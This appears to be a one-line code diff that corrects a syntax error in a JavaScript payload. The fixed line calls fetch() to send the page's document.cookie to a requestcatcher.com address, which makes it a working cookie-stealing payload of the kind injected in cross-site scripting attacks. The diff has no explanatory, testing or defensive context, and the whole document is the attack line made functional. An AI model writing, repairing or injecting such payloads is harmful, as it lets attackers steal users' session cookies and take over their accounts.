@@ -1,1 +1,1 @@
-fetch('https://ry.requestcatcher.com/?c=' + document.cookie')
+fetch('https://ry.requestcatcher.com/?c=' + document.cookie)
